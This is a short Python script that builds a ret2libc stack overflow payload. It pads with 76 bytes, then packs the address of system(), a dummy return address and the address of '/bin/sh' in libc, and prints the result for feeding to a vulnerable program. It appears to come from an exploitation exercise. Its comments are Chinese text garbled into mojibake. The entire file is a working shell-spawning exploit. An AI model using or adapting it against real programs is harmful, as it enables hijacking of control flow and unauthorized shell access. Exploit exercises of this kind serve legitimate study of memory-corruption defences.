# -*- coding: utf-8 -*-
import struct
buffer="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"#����������
system=struct.pack("I",0xb7ecffb0)
sys_ret="AAAA"#��ٵķ��ص�ַ
binsh=struct.pack("I",0xb7e97000+1176511)
padding=buffer+system+sys_ret+binsh#������ٵ���system������ٹ�����ٵķ��ص�ַ���ٽ�/bin/sh��ջ
print(padding)
